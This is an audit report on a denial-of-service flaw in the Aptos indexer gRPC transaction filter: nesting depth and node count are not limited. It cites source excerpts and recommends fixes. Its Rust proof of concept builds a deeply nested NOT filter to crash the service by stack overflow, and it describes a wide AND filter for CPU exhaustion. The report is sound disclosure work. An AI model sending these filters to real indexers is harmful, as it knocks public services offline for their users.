# Audit Report

## Title
Unbounded Transaction Filter Complexity Enables Indexer API DoS via Stack Overflow and CPU Exhaustion

## Summary
The indexer gRPC service's `GetTransactionsRequest` transaction filter validation only checks the top-level protobuf encoded size (default 10KB), but does not enforce depth or node count limits on nested filter structures. This allows attackers to craft filters with extreme nesting depth or width that fit within the size limit but cause stack overflow crashes or CPU exhaustion during evaluation, resulting in indexer API denial of service.

## Finding Description
The `BooleanTransactionFilter` structure supports recursive nesting through `LogicalAnd`, `LogicalOr`, and `LogicalNot` operations. [1](#0-0) 

When parsing filters from protobuf, the validation only checks encoded size at the top level: [2](#0-1) 

However, the recursive parsing for nested filters passes `None` for the size parameter, bypassing validation: [3](#0-2) 

The same issue exists for `LogicalOr` and `LogicalNot`: [4](#0-3)  and [5](#0-4) 

During transaction matching, filters are evaluated recursively: [6](#0-5) 

The default maximum filter size is only 10KB: [7](#0-6) 

**Attack Vector 1 - Stack Overflow**: An attacker crafts a deeply nested `LogicalNot` chain (e.g., `NOT(NOT(NOT(...NOT(simple_filter)...)))`) with ~1000 levels. Due to compact protobuf encoding (~5-10 bytes per level), this fits within 10KB. During evaluation, the recursive `matches()` calls create 1000+ stack frames, causing stack overflow and crashing the indexer service.

**Attack Vector 2 - CPU Exhaustion**: An attacker crafts a wide `LogicalAnd` or `LogicalOr` operation containing thousands of sub-filters. Each transaction match must evaluate all sub-filters, causing severe CPU consumption and service slowdown.

The filter is used in indexer data services without additional depth/count validation: [8](#0-7) 

Note: While the security question mentions "exponential evaluation time," the actual complexity is linear O(N) in the number of filter nodes. However, the unbounded N enables the DoS attack.

## Impact Explanation
This vulnerability qualifies as **High Severity** under the Aptos bug bounty program's "API crashes" category. The indexer gRPC API is critical infrastructure that:

1. **Service Crash**: Stack overflow from deep nesting causes immediate indexer service termination
2. **Service Degradation**: CPU exhaustion from wide filters causes severe performance degradation, potentially making the API unusable
3. **Availability Impact**: Clients cannot retrieve blockchain transaction data during attack or service recovery

While this does not directly affect consensus or validator nodes, the indexer API is essential infrastructure for blockchain data access, and its unavailability constitutes a significant protocol violation.

## Likelihood Explanation
**Likelihood: High**

- **Attack Complexity**: Low - attacker only needs to construct a malicious protobuf message
- **Attacker Requirements**: None - any unauthenticated client can send `GetTransactionsRequest`
- **Detection Difficulty**: Moderate - excessive CPU usage or crashes may be noticed, but attributing to specific malicious requests is challenging
- **Practical Feasibility**: A 1000-level NOT chain fits easily within 10KB, making exploitation trivial

## Recommendation
Implement multi-layered filter complexity validation:

1. **Add depth limit checking** during filter parsing:
```rust
// In BooleanTransactionFilter::new_from_proto
const MAX_FILTER_DEPTH: usize = 50;

fn new_from_proto_with_depth(
    proto_filter: aptos_protos::indexer::v1::BooleanTransactionFilter,
    max_filter_size: Option<usize>,
    current_depth: usize,
) -> Result<Self> {
    ensure!(
        current_depth <= MAX_FILTER_DEPTH,
        "Filter nesting exceeds maximum depth of {}", MAX_FILTER_DEPTH
    );
    
    // Existing size check...
    
    // Pass depth to recursive calls
    match proto_filter.filter {
        // ... in LogicalAnd/Or/Not, pass current_depth + 1
    }
}
```

2. **Add node count limit** by tracking total filter nodes during parsing

3. **Pass size limit recursively** in `TryFrom` implementations instead of `None`

4. **Consider iterative evaluation** instead of recursive to prevent stack overflow

5. **Add resource limits** per request (e.g., maximum filter evaluation time)

## Proof of Concept
```rust
// Construct a deeply nested NOT filter that crashes the indexer
use aptos_protos::indexer::v1::{BooleanTransactionFilter, ApiFilter, TransactionRootFilter};

fn create_deep_not_chain(depth: usize) -> BooleanTransactionFilter {
    // Base case: simple filter
    let mut filter = BooleanTransactionFilter {
        filter: Some(boolean_transaction_filter::Filter::ApiFilter(ApiFilter {
            filter: Some(api_filter::Filter::TransactionRootFilter(
                TransactionRootFilter { success: Some(true), transaction_type: None }
            ))
        }))
    };
    
    // Wrap in NOT operations
    for _ in 0..depth {
        filter = BooleanTransactionFilter {
            filter: Some(boolean_transaction_filter::Filter::LogicalNot(
                Box::new(filter)
            ))
        };
    }
    
    filter
}

// Create 1000-level deep filter (fits in ~10KB)
let malicious_filter = create_deep_not_chain(1000);

// Send in GetTransactionsRequest
let request = GetTransactionsRequest {
    starting_version: Some(0),
    transactions_count: Some(100),
    batch_size: Some(10),
    transaction_filter: Some(malicious_filter),
};

// When indexer evaluates this filter against transactions:
// - Creates 1000+ recursive stack frames in matches()
// - Causes stack overflow and service crash
```

For CPU exhaustion, construct a `LogicalAnd` with 5000 simple filters, which also fits within 10KB when encoded.

**Notes**

The vulnerability exists in the indexer gRPC infrastructure layer, not the core consensus or Move VM components. While it doesn't directly compromise blockchain security, it represents a critical availability issue for the indexer API service. The security question's premise about "exponential evaluation time" is technically incorrect (complexity is linear in filter nodes, not exponential), but the underlying vulnerability of unbounded filter complexity enabling DoS attacks is valid and exploitable.

### Citations

**File:** protos/rust/src/pb/aptos.indexer.v1.rs (L88-107)
```rust
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct BooleanTransactionFilter {
    #[prost(oneof="boolean_transaction_filter::Filter", tags="1, 2, 3, 4")]
    pub filter: ::core::option::Option<boolean_transaction_filter::Filter>,
}
/// Nested message and enum types in `BooleanTransactionFilter`.
pub mod boolean_transaction_filter {
    #[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, PartialEq, ::prost::Oneof)]
    pub enum Filter {
        #[prost(message, tag="1")]
        ApiFilter(super::ApiFilter),
        #[prost(message, tag="2")]
        LogicalAnd(super::LogicalAndFilters),
        #[prost(message, tag="3")]
        LogicalOr(super::LogicalOrFilters),
        #[prost(message, tag="4")]
        LogicalNot(::prost::alloc::boxed::Box<super::BooleanTransactionFilter>),
    }
}
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L93-127)
```rust
impl BooleanTransactionFilter {
    pub fn new_from_proto(
        proto_filter: aptos_protos::indexer::v1::BooleanTransactionFilter,
        max_filter_size: Option<usize>,
    ) -> Result<Self> {
        if let Some(max_filter_size) = max_filter_size {
            ensure!(
                proto_filter.encoded_len() <= max_filter_size,
                format!(
                    "Filter is too complicated. Max size: {} bytes, Actual size: {} bytes",
                    max_filter_size,
                    proto_filter.encoded_len()
                )
            );
        }
        Ok(
            match proto_filter
                .filter
                .ok_or(anyhow!("Oneof is not set in BooleanTransactionFilter."))?
            {
                aptos_protos::indexer::v1::boolean_transaction_filter::Filter::ApiFilter(
                    api_filter,
                ) => TryInto::<APIFilter>::try_into(api_filter)?.into(),
                aptos_protos::indexer::v1::boolean_transaction_filter::Filter::LogicalAnd(
                    logical_and,
                ) => BooleanTransactionFilter::And(logical_and.try_into()?),
                aptos_protos::indexer::v1::boolean_transaction_filter::Filter::LogicalOr(
                    logical_or,
                ) => BooleanTransactionFilter::Or(logical_or.try_into()?),
                aptos_protos::indexer::v1::boolean_transaction_filter::Filter::LogicalNot(
                    logical_not,
                ) => BooleanTransactionFilter::Not(logical_not.try_into()?),
            },
        )
    }
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L240-258)
```rust
impl Filterable<Transaction> for BooleanTransactionFilter {
    fn validate_state(&self) -> Result<(), FilterError> {
        match self {
            BooleanTransactionFilter::And(and) => and.is_valid(),
            BooleanTransactionFilter::Or(or) => or.is_valid(),
            BooleanTransactionFilter::Not(not) => not.is_valid(),
            BooleanTransactionFilter::Filter(filter) => filter.is_valid(),
        }
    }

    fn matches(&self, item: &Transaction) -> bool {
        match self {
            BooleanTransactionFilter::And(and) => and.matches(item),
            BooleanTransactionFilter::Or(or) => or.matches(item),
            BooleanTransactionFilter::Not(not) => not.matches(item),
            BooleanTransactionFilter::Filter(filter) => filter.matches(item),
        }
    }
}
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L265-276)
```rust
impl TryFrom<aptos_protos::indexer::v1::LogicalAndFilters> for LogicalAnd {
    type Error = anyhow::Error;

    fn try_from(proto_filter: aptos_protos::indexer::v1::LogicalAndFilters) -> Result<Self> {
        Ok(Self {
            and: proto_filter
                .filters
                .into_iter()
                .map(|f| BooleanTransactionFilter::new_from_proto(f, None))
                .collect::<Result<_>>()?,
        })
    }
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L305-316)
```rust
impl TryFrom<aptos_protos::indexer::v1::LogicalOrFilters> for LogicalOr {
    type Error = anyhow::Error;

    fn try_from(proto_filter: aptos_protos::indexer::v1::LogicalOrFilters) -> Result<Self> {
        Ok(Self {
            or: proto_filter
                .filters
                .into_iter()
                .map(|f| BooleanTransactionFilter::new_from_proto(f, None))
                .collect::<Result<_>>()?,
        })
    }
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L345-357)
```rust
impl TryFrom<Box<aptos_protos::indexer::v1::BooleanTransactionFilter>> for LogicalNot {
    type Error = anyhow::Error;

    fn try_from(
        proto_filter: Box<aptos_protos::indexer::v1::BooleanTransactionFilter>,
    ) -> Result<Self> {
        Ok(Self {
            not: Box::new(BooleanTransactionFilter::new_from_proto(
                *proto_filter,
                None,
            )?),
        })
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L20-21)
```rust
// Default maximum size in bytes for transaction filters.
pub const DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES: usize = 10_000;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L83-100)
```rust
                let filter = if let Some(proto_filter) = request.transaction_filter {
                    match filter_utils::parse_transaction_filter(
                        proto_filter,
                        self.max_transaction_filter_size_bytes,
                    ) {
                        Ok(filter) => Some(filter),
                        Err(err) => {
                            info!("Client error: {err:?}.");
                            let _ = response_sender.blocking_send(Err(err));
                            COUNTER
                                .with_label_values(&["historical_data_service_invalid_filter"])
                                .inc();
                            continue;
                        },
                    }
                } else {
                    None
                };
```
